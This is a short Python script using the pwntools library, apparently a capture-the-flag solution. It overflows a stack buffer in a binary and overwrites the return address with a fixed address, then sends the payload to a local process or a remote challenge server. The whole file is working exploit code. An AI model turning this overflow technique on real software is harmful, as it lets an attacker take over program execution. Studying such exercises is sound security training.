#!/usr/bin/env python3

from pwn import *
from pwn import p64

host = "178.62.9.10:31295"

if args.REMOTE:
    ip, port = host.split(":")
    p = remote(ip, port)
else:
    p = process("./binary")

payload = b"A" * (0x20 + 8)
payload += p64(0x401176)

p.sendline(payload)
print(p.recvline())
